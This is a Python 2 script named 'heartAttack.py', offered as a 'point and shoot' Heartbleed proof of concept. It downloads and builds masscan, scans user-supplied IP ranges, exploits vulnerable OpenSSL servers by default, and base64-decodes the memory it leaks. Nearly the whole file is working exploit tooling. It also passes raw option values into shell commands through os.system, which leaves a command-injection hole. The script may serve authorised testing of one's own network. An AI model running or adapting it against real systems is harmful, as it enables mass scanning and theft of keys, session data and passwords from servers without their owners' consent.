#!/usr/bin/python

#######################
# heartAttack.py -- The Heartbleed point and shoot PoC
#
# Intended for any persons using the interwebs.
# This is lazy utilization of 'Masscan' to quickly find, exploit,
# and decode the OpenSSL heartbleed vulnerability quickly.
# Made to work and function on Linux only atm. Haven't tested on OSX.
# Now nobody will question if you have heartbleed :0
#
# NOTE: If running install the first time yields an error that the 'make file can't be found',
# 	then just run it againand it should work. Trying to fix this problem atm
#
# Mad props to Robert David Graham of 'Masscan' and Jim Hofstee
#
# Author: spaceB0x (Tyler Welton)
# 		github.com/spaceB0x
########################


import os
import urllib
import optparse
import zipfile
import optparse
import base64
#import multiprocessing 

#SetupStuff=====================================================================
def dlZip():
	print "***Finding file"
	url='https://github.com/robertdavidgraham/masscan/archive/master.zip'
	zip_name='masscan-master.zip'
	file_name='masscan-master'
	#check if file exists in working dir
	print "** Downloading %s" %zip_name
	urllib.urlretrieve(url,zip_name)
	print "** %s download complete" %zip_name

def uz(zf):
	if (os.path.isfile(zf)):
		print "** Unzipping"
	else:
		print "** Download error"
		return
	f=zipfile.ZipFile(zf)
	f.extractall()

def make():
		#assumes you are in massca-master directory
	#if(os.path.isfile('./bin/masscan')):
	#	print "**"
	#	else:
	print "** Making masscan..."
	os.system('make')
	print "** Masscan make is complete!"

def setup():
	zip_name="masscan-master.zip"
	file_name="masscan-master"

	#check for install, download, or unzip
	if (os.path.isdir(file_name)):
		print '**masscan found'
		os.chmod(file_name, 755)
		os.chdir(file_name)
		make()
		os.chdir('bin')
		##Do main junk
	elif (os.path.isfile(zip_name)):
		uz(zip_name)
		os.chmod(file_name, 755)
		os.chdir(file_name)
		make()
		os.chdir('bin')
	else:
		q=str(raw_input("**You do not have 'masscan' installed in this directory.\n**Is it ok if I install it for you? (Y/n):"))
		if (q.__eq__('y') | q.__eq__('Y')):
			dlZip()
			uz(zip_name)
			os.chmod(file_name, 755)
			os.system('cd masscan-master')
			make()
		elif(q.__eq__('n') | q.__eq__('N')):
			print "** That's ok. Have a good day"
			return
		else:
			print "**I'm sorry that doesn't make sense to my little binary brain"
			setup()
#Find/decode=============================================================================================
def decode(string):
	data=base64.b64decode(string)
	return data	

def runMS(ips, ports, output,unusedip, mode):
	m=mode.lower()
	#mode is 'b' for find hb; or 'a' for exploit heartbleed
	if (m=='a'):
		if(os.path.isfile('masscan')=='false'):
			print "** No file 'masscan' in this directory"
			return
		
		#Run the actual Scan
		os.system('./masscan -p %d %s -S %s --rate=500 --heartbleed --capture heartbleed > %s' %(ports, ips,unusedip, output))
	elif(m=='b'):
		if(os.path.isfile('masscan')=='false'):
			print "** No file 'masscan' in this directory"
			return
		os.system('./masscan -p %d %s -S %s --rate=500 --heartbleed > %s' %(ports, ips, unusedip, output))

def report(output,mode):
	#Get the encoded part extracted
	t=0
	m=mode.lower()
	if (m=='a'):
		f=open(output,"r")
		whole=f.read()
		word_list=whole.split(" ")
		for i in range(len(word_list)):
			if (word_list[i]=='[heartbleed]'):
				t=i+1
				encoded=word_list[t]
				decoded=decode(str(word_list[t]))
				print decoded
		f.close()
	elif (m=='b'):
		f=open(output, "r")
		for line in f:
			if(line.find('[vuln]') != -1):
				print line
	
		f.close()

#MAIN====================================================================================================
def main():
	#option parser
	desc=""" HeartAttack will autopwn your network for the infamous heartbleed vulnerability. 
Just point and shoot. It takes an IP address or a range of IPs and searches for vulnerable
machines. If found, a vulnerable machine will be exploited and decoded for proof of concept,
unless otherwise specified by the MODE option. An unused IP address on the vlan MUST be 
provided in order for the masscan portion to work properlyl. Enjoy taking this to your CIO.
				Cheers! --spaceB0x
"""
	parser=optparse.OptionParser("%prog"+ "-i <ip_range> -p <ports> -w <outputfile>", description=desc)
	parser.add_option('-m', dest='mode', type='string', help='Mode A finds and exploits heartbleed. Mode B just finds heartbleed. If unspecified, it will default to Mode A.',default='a')	
	parser.add_option('-i', dest='ips', type='string', help='IP address or range of addresses to scan')
	parser.add_option('-p', dest='ports', type='int', help='Port(s) if any to scan. Defaults to 443 if none specified', default=443)
	parser.add_option('-w', dest='output', type='string', help='File to send output results to')
	parser.add_option('-u', dest='unusedip', type='string', help="Must supply an IP address from the subnet that isn't being used")

	(options,args)=parser.parse_args()
	#check for missing options
	if ((options.ips==None) | (options.output==None) |(options.unusedip==None)):
		os.system('python heartAttack.py --help')
		exit(0)

	#os
	oper= str(os.name) 
	url='https://github.com/robertdavidgraham/masscan/archive/master.zip'
	
	#Do linux/MacOS specific stuff
	if oper=='posix':
		setup()
		runMS(options.ips, options.ports, options.output, options.unusedip, options.mode)
		report(options.output,options.mode)
		# Formalize the report
		
	#If windows...break the news
	if oper=='nt':
		print "** Sorry Dude. This program requires 'masscan'. Normally I would download \nit for you but it doesn't work so well on Windows"
		print "** Try again on a Linux or MacOSX machine"
		return

if __name__=='__main__':
	main()
